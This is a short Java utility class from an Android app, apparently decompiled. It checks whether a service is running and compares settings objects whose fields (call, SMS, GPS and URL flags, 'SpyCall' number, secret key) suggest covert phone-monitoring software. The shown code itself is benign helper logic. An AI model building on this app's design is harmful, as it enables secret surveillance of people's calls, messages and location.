package iits.common;

import android.app.ActivityManager;
import android.content.Context;
import iits.code.dto.Setting_DTO;
import java.util.List;

public class Function {
    public static boolean isServiceRunning(Context context, String className) {
        List<ActivityManager.RunningServiceInfo> serviceList = ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE);
        if (serviceList.size() <= 0) {
            return false;
        }
        for (int i = 0; i < serviceList.size(); i++) {
            if (serviceList.get(i).service.getClassName().equals(className)) {
                return true;
            }
        }
        return false;
    }

    public static boolean compareSettingsObject(Setting_DTO setting1, Setting_DTO setting2) {
        if (setting1.getFlagCall() != setting2.getFlagCall()) {
            return false;
        }
        if (setting1.getFlagGPS() != setting2.getFlagGPS()) {
            return false;
        }
        if (setting1.getFlagSMS() != setting2.getFlagSMS()) {
            return false;
        }
        if (setting1.getFlagSpyCall() != setting2.getFlagSpyCall()) {
            return false;
        }
        if (setting1.getFlagURL() != setting2.getFlagURL()) {
            return false;
        }
        if (setting1.getRunMode() != setting2.getRunMode()) {
            return false;
        }
        if (setting1.getGPSInterval() != setting2.getGPSInterval()) {
            return false;
        }
        if (setting1.getHorizontal() != setting2.getHorizontal()) {
            return false;
        }
        if (!setting1.getSecretKey().equals(setting2.getSecretKey())) {
            return false;
        }
        if (!setting1.getSpyCallNumber().equals(setting2.getSpyCallNumber())) {
            return false;
        }
        return true;
    }
}
